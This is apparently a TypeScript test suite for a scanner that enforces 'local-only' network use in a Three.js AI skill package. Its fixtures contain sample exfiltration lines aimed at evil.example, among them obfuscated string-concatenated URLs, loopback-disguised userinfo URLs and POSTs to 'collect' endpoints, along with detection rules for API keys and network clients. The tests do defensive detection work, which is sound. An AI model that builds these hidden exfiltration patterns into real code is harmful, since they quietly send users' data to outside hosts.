/** Focused tests for audit-skill-local-only.ts. */

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const SCRIPT = join(
  dirname(fileURLToPath(import.meta.url)),
  "audit-skill-local-only.ts",
);

interface AuditResult {
  status: number | null;
  stdout: string;
  stderr: string;
}

function runAudit(
  files: Record<string, string>,
  setup?: (root: string) => void,
): AuditResult {
  const directory = mkdtempSync(join(tmpdir(), "audit-skill-local-only-"));
  const root = join(directory, "skill");
  try {
    for (const [relativePath, content] of Object.entries(files)) {
      const path = join(root, relativePath);
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, content, "utf8");
    }
    setup?.(root);
    const result = spawnSync(
      process.execPath,
      ["--import", "tsx", SCRIPT, root],
      {
        encoding: "utf8",
      },
    );
    if (result.error) throw result.error;
    return {
      status: result.status,
      stdout: result.stdout,
      stderr: result.stderr,
    };
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
}

function diagnostic(result: AuditResult): string {
  return result.stdout + result.stderr;
}

test("accepts a local Three.js skill", () => {
  const result = runAudit({
    "SKILL.md": "Use Three.js and local browser tools only.",
    "references/assets.md": "Load /assets/models/hero.glb.",
    "assets/game/main.ts": "import * as THREE from 'three'; void THREE;",
    "assets/game/playwright.config.ts":
      "const url = 'http://127.0.0.1:5188';",
    "assets/game/icon.svg":
      '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test("accepts exact protocol-relative loopback URLs", () => {
  const result = runAudit({
    "assets/game/main.ts": [
      "const host = '//localhost:5188/game';",
      "const ipv4 = '//127.0.0.1:5188/game';",
      "const ipv6 = '//[::1]:5188/game';",
      "void host; void ipv4; void ipv6;",
    ].join("\n"),
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test("rejects protocol-relative userinfo disguised as loopback", () => {
  const result = runAudit({
    "scripts/client.ts":
      "export const endpoint = '//localhost@evil.example/collect';\n",
    "assets/style.css":
      "body { background: url(//127.0.0.1@evil.example/image.png); }\n",
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/protocol-relative URL/g)?.length, 2);
});

test("rejects a remote runtime URL", () => {
  const result = runAudit({
    "references/assets.md": "Load https://example.com/hero.glb",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /non-local URL/);
});

test("scans textual glTF manifests for remote dependencies", () => {
  const result = runAudit({
    "assets/models/remote.gltf": JSON.stringify({
      asset: { version: "2.0" },
      buffers: [{ uri: "https:" + "//cdn.example/game.bin", byteLength: 4 }],
    }),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /remote\.gltf/);
  assert.match(result.stdout, /non-local URL/);
});

test("decodes escaped-solidus URLs in glTF string values", () => {
  const result = runAudit({
    "assets/models/escaped.gltf": [
      "{",
      '  "asset": { "version": "2.0" },',
      '  "buffers": [{ "uri": "https:\\/\\/cdn.example\\/game.bin", "byteLength": 4 }]',
      "}",
    ].join("\n"),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /escaped\.gltf:3/);
  assert.match(result.stdout, /https:\/\/cdn\.example\/game\.bin/);
});

test("decodes escaped URLs in JSON and JavaScript strings", () => {
  const result = runAudit({
    "assets/game/config.json":
      '{"api":"https:\\/\\/evil.example\\/collect"}',
    "assets/game/model.ts":
      "const model = 'https:\\/\\/evil.example\\/hero.glb'; loader.load(model);\n",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /assets\/game\/config\.json/);
  assert.match(result.stdout, /assets\/game\/model\.ts/);
});

test("scans dist output for embedded remote URLs", () => {
  const rejected = runAudit({
    "assets/game/dist/assets/index.js":
      "const model = 'https://cdn.example/hero.glb';\nfetch(model);\n",
  });
  assert.equal(rejected.status, 1);
  assert.match(rejected.stdout, /dist\/assets\/index\.js/);
  assert.match(rejected.stdout, /non-local URL/);

  const localBundle = runAudit({
    "assets/game/dist/assets/index.js": "fetch('/models/hero.glb');\n",
  });
  assert.equal(localBundle.status, 0, diagnostic(localBundle));
});

test("still scans dist output for persistent network clients", () => {
  const result = runAudit({
    "assets/game/dist/assets/realtime.js":
      "const socket=new WebSocket(endpoint);socket.addEventListener('message',onMessage);\n",
    "assets/game/dist/assets/minified.js":
      "(()=>{const client=require('ws');client.connect(endpoint)})();\n",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /dist\/assets\/realtime\.js/);
  assert.match(result.stdout, /dist\/assets\/minified\.js/);
  assert.match(result.stdout, /network client command\/import/);
});

test("constant-folds hidden remote targets in dist while allowing local targets", () => {
  const remote = runAudit({
    "assets/game/dist/app.js": [
      "const endpoint='https:'+'/'+'/evil.example/collect';",
      "fetch(endpoint);",
      "const request=new XMLHttpRequest();",
      "const metrics='https:'+'/'+'/evil.example/metrics';",
      "request.open('POST',metrics);",
    ].join("\n"),
  });
  assert.equal(remote.status, 1);
  assert.ok((remote.stdout.match(/non-local network target/g)?.length ?? 0) >= 2);

  const local = runAudit({
    "assets/game/dist/app.js": [
      "const chunk='/'+'assets/chunk.js';",
      "fetch(chunk);",
      "const request=new XMLHttpRequest();",
      "request.open('GET','/state.json');",
    ].join("\n"),
  });
  assert.equal(local.status, 0, diagnostic(local));
});

test("scans executable component scripts and Astro frontmatter", () => {
  const result = runAudit({
    "assets/game/App.vue": [
      '<script setup lang="ts">',
      "fetch('https://evil.example/vue');",
      "</script>",
      '<style>/* https://style.example/citation */</style>',
    ].join("\n"),
    "assets/game/Page.astro": [
      "---",
      "const endpoint = 'https://evil.example/astro';",
      "---",
      "<div>Local markup</div>",
    ].join("\n"),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /App\.vue/);
  assert.match(result.stdout, /Page\.astro/);
  assert.doesNotMatch(result.stdout, /style\.example/);
});

test("explicitly rejects symbolic links", () => {
  const result = runAudit(
    {
      "assets/game/real.ts": "export const local = true;\n",
      "shared/current.ts": "export const current = true;\n",
    },
    (root) => {
      symlinkSync("real.ts", join(root, "assets/game/linked.ts"));
      symlinkSync("../../shared", join(root, "assets/game/linked-directory"));
    },
  );
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/symbolic link is not allowed/g)?.length, 2);
});

test("ignores generated JavaScript comment citations but not runtime strings", () => {
  const commentsOnly = runAudit({
    "assets/game/dist/index.js":
      "// Research: https://papers.example/lighting\nexport const local = '/game';\n",
  });
  assert.equal(commentsOnly.status, 0, diagnostic(commentsOnly));

  const runtime = runAudit({
    "assets/game/dist/index.js":
      "export const endpoint = 'https://papers.example/lighting';\n",
  });
  assert.equal(runtime.status, 1);
  assert.match(runtime.stdout, /non-local URL/);
});

test("rejects remote source-map directives without treating citations as runtime URLs", () => {
  const remote = runAudit({
    "assets/game/dist/index.js":
      "export const local = '/game';\n//# sourceMappingURL=https://maps.example/index.js.map\n",
  });
  assert.equal(remote.status, 1);
  assert.match(remote.stdout, /non-local source map URL/);

  const allowed = runAudit({
    "assets/game/dist/local.js": [
      "// Research citation: https://papers.example/rendering",
      "export const local = '/game';",
      "//# sourceMappingURL=local.js.map",
      "/*# sourceMappingURL=data:application/json;base64,e30= */",
    ].join("\n"),
  });
  assert.equal(allowed.status, 0, diagnostic(allowed));
});

test("rejects protocol-relative URLs in TypeScript and CSS", () => {
  const result = runAudit({
    "scripts/client.ts": "export const endpoint = '//cdn.example.com/collect';\n",
    "assets/style.css": "body { background: url(//cdn.example.com); }\n",
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/protocol-relative URL/g)?.length, 2);
});

test("rejects single-label protocol-relative hosts with paths", () => {
  const result = runAudit({
    "scripts/client.ts": "export const endpoint = '//collector/ingest';\n",
    "assets/style.css": "body { background: url(//cdn/image.png); }\n",
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/protocol-relative URL/g)?.length, 2);
});

test("accepts official Three.js research URLs in Markdown", () => {
  const result = runAudit({
    "SKILL.md": "Local only.",
    "references/rendering.md":
      "Read https://threejs.org/docs/pages/WebGLRenderer.html and "
      + "https://github.com/mrdoob/three.js/blob/dev/src/renderers/WebGLRenderer.js.",
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test("accepts exactly the canonical repository URL in the root README", () => {
  const result = runAudit({
    "SKILL.md": "Local only.",
    "README.md":
      "Install [chrislaupama/threejs-game-studio]"
      + "(https://github.com/chrislaupama/threejs-game-studio).",
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test("rejects canonical-repository variants and use outside README", () => {
  const result = runAudit({
    "README.md": [
      "https://github.com/chrislaupama/threejs-game-studio/",
      "http://github.com/chrislaupama/threejs-game-studio",
      "https://github.com/chrislaupama/threejs-game-studio?tab=readme",
    ].join("\n"),
    "SKILL.md":
      "https://github.com/chrislaupama/threejs-game-studio",
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/non-local URL/g)?.length, 4);
});

test("rejects arbitrary and nonofficial Markdown URLs", () => {
  const result = runAudit({
    "SKILL.md": "Local only.",
    "references/research.md":
      "Reject https://example.com/guide and "
      + "https://github.com/someone/three.js and "
      + "https://threejs.org.example.com/phishing.",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /non-local URL/);
  assert.equal(result.stdout.match(/non-local URL/g)?.length, 3);
});

test("rejects official research URLs outside Markdown", () => {
  const result = runAudit({
    "SKILL.md": "Local only.",
    "assets/game/main.ts":
      "const runtimeUrl = 'https://threejs.org/examples/models/hero.glb';",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /non-local URL/);
});

test("rejects credentials and MCP invocation syntax", () => {
  const result = runAudit({
    "SKILL.md": "Read GEMINI_API_KEY then call mcp__assets__generate.",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /provider credential/);
  assert.match(result.stdout, /MCP invocation syntax/);
});

test("rejects a provider helper file", () => {
  const result = runAudit({
    "scripts/generate_image.py": "print('generator')",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /provider helper file/);
});

test("rejects TypeScript and JavaScript provider-helper equivalents", async (t) => {
  const filenames = [
    "generate_image.ts",
    "generate-image.js",
    "probe_asset_credentials.mjs",
    "threejs-3d-asset.tsx",
    "threejs_audio_asset.cjs",
    "generate-image.mts",
  ];
  for (const filename of filenames) {
    await t.test(filename, () => {
      const result = runAudit({
        [`scripts/${filename}`]: "export {};\n",
      });
      assert.equal(result.status, 1);
      assert.match(result.stdout, /provider helper file/);
    });
  }
});

test("rejects a network-client import", () => {
  const result = runAudit({
    "scripts/download.py": "import requests\n",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /network client command\/import/);
});

test("rejects network clients in TypeScript and JavaScript scripts", async (t) => {
  const fixtures = new Map([
    ["scripts/download.ts", "import { request } from 'node:https';\nvoid request;\n"],
    ["scripts/fetch.js", "export function load(target) { return fetch(target); }\n"],
    ["scripts/socket.mjs", "export const socket = new WebSocket(endpoint);\n"],
    ["scripts/client.cjs", "const client = require('undici');\nvoid client;\n"],
    ["scripts/client.mts", "import net from 'node:net';\nnet.connect(443);\n"],
    ["scripts/http2.ts", "import { connect } from 'node:http2';\nvoid connect;\n"],
    ["scripts/dns.ts", "import { resolve4 } from 'node:dns/promises';\nvoid resolve4;\n"],
  ]);
  for (const [path, source] of fixtures) {
    await t.test(path, () => {
      const result = runAudit({ [path]: source });
      assert.equal(result.status, 1);
      assert.match(result.stdout, /network client command\/import/);
    });
  }
});

test("ignores legal attribution and lockfile registry URLs", () => {
  const result = runAudit({
    "NOTICE.md":
      "Source https://github.com/example/project and GEMINI_API_KEY excluded.",
    "assets/game/package-lock.json":
      '{"resolved":"https://registry.npmjs.org/three"}',
    "SKILL.md": "Local only.",
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test("runs the CLI main guard when invoked through a symbolic link", () => {
  const directory = mkdtempSync(join(tmpdir(), "audit-skill-main-link-"));
  try {
    const root = join(directory, "skill");
    mkdirSync(root, { recursive: true });
    writeFileSync(join(root, "SKILL.md"), "Local only.\n", "utf8");
    const linkedScript = join(directory, "audit-skill-linked.ts");
    symlinkSync(SCRIPT, linkedScript);
    const result = spawnSync(
      process.execPath,
      ["--import", "tsx", linkedScript, root],
      { encoding: "utf8" },
    );
    assert.equal(result.status, 0, result.stdout + result.stderr);
    assert.match(result.stdout, /Skill local-only audit passed/);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});
